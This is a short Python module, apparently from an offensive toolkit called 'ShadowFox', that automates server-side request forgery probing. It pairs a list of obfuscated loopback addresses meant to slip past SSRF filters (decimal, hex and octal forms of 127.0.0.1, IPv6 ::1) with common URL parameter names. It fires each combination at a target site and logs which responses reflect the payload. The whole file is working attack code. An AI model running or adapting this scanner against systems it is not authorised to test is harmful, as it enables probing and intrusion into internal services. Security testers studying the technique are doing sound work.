import requests
from core.shadow_logger import log_result
from tools.shadowfox_config import get_path

BYPASS_LIST = [
    "http://127.1",
    "http://2130706433",
    "http://0x7f000001",
    "http://017700000001",
    "http://0177.0.0.1",
    "http://[::1]",
    "http://localhost",
    "http://127.0.0.1"
]

SSRF_PARAMS = [
    "url", "next", "target", "domain", "site", "feed", "redirect", "return", "host"
]

OUTPUT = get_path("logs") + "/ssrf_bypass_results.jsonl"

def bypass_ssrf(domain, base_url):
    print(f"[*] SSRF Bypass modul aktiviran na: {domain}")
    for param in SSRF_PARAMS:
        for bypass_url in BYPASS_LIST:
            full = f"{base_url}?{param}={bypass_url}"
            try:
                r = requests.get(full, timeout=10)
                result = {
                    "url": full,
                    "status": r.status_code,
                    "length": len(r.text),
                    "param": param,
                    "bypass": bypass_url,
                    "reflected": bypass_url in r.text
                }
                log_result(OUTPUT, result)
                if result["reflected"]:
                    print(f"[✓] SSRF reflektovan → {full}")
            except Exception as e:
                continue
    print(f"[✓] Završeno. Log: {OUTPUT}")
